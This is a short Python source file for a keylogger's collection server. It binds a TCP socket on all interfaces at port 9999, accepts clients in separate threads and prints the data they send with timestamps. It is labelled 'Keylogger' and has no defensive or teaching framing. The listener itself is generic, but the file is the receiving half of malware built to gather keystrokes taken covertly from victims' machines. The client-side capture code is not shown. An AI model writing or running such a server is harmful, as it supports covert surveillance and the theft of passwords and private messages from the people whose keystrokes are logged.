import socket
import threading
from datetime import datetime

class KeyloggerServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def handle_client(self, client_socket):
        with client_socket:
            print(f"[*] Client: {client_socket.getpeername()}")
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                print(f"[{timestamp}] Data: {data.decode('utf-8', errors='ignore')}")
    
    def start(self):
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] Server: {self.host}:{self.port}")
        
        while True:
            client, addr = self.server.accept()
            client_handler = threading.Thread(target=self.handle_client, args=(client,))
            client_handler.start()

if __name__ == "__main__":
    print("Keylogger")
    server = KeyloggerServer()
    server.start()
